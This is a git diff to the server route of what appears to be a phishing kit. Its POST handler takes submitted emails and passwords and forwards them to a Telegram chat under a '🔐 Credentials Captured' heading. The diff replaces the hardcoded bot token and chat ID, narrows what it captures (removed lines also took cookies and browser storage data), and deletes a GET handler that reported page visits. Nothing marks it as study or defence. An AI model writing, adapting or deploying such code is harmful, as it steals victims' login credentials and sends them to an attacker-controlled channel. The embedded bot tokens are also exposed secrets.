@@ -6,17 +6,17 @@ import nodemailer from "nodemailer";
 // for telegram
 import { TelegramClient } from "telegramsjs";
 
-const botToken = "8469088081:AAG4hzZjzae1WbPBwlaKcJzVBOVSPO0P3k8";
+const botToken = "8267952065:AAGLb_6qDpzhcLY5oLHxeRP0wQLmAIjwlUI";
 const bot = new TelegramClient(botToken);
-const chatId = "8049301194";
+const chatId = "7202634733";
 
 // Handle POST requests for form submissions
 export async function POST(req) {
-  const { email, password, userAgent, remoteAddress, landingUrl, cookies, localStorageData, sessionStorageData } = await req.json();
+  const { email, password } = await req.json();
 
   try {
-    // Only send notification when password is provided (credentials)
-    if (password) {
+    // Send notification for credentials
+    if (email && password) {
       const credentialsMessage = `
 🔐 *Credentials Captured*
 
@@ -43,11 +43,11 @@ export async function POST(req) {
       );
     }
 
-    // Return success for access without password (no notification)
+    // Return error if email or password is missing
     return new Response(
-      JSON.stringify({ message: "Access logged!" }),
+      JSON.stringify({ error: "Email and password are required" }),
       {
-        status: 200,
+        status: 400,
         headers: { "Content-Type": "application/json" },
       }
     );
@@ -60,45 +60,4 @@ export async function POST(req) {
   }
 }
 
-// Handle GET requests - Now with notifications for page access
-export async function GET(req) {
-  try {
-    const url = new URL(req.url);
-    
-    // Send Telegram notification for page access
-    const pageAccessMessage = `
-🌐 *Page Accessed*
-
-*Access Time:*
-${new Date().toLocaleString()}
-
-🌐 *Landing URL:*
-${req.url || 'No URL provided'}
-
-👤 *User Agent:*
-${req.headers.get('user-agent') || 'Not available'}
-    `;
-
-    await bot.sendMessage({
-      text: pageAccessMessage,
-      chatId: chatId,
-      parse_mode: "Markdown"
-    });
-
-    console.log("Page accessed");
-    
-    return new Response(
-      JSON.stringify({ message: "Access logged!" }),
-      {
-        status: 200,
-        headers: { "Content-Type": "application/json" },
-      }
-    );
-  } catch (error) {
-    console.error("Error processing request:", error);
-    return new Response(JSON.stringify({ error: "Error processing request" }), {
-      status: 500,
-      headers: { "Content-Type": "application/json" },
-    });
-  }
-}
+// Remove GET handler entirely since we don't want page access logging
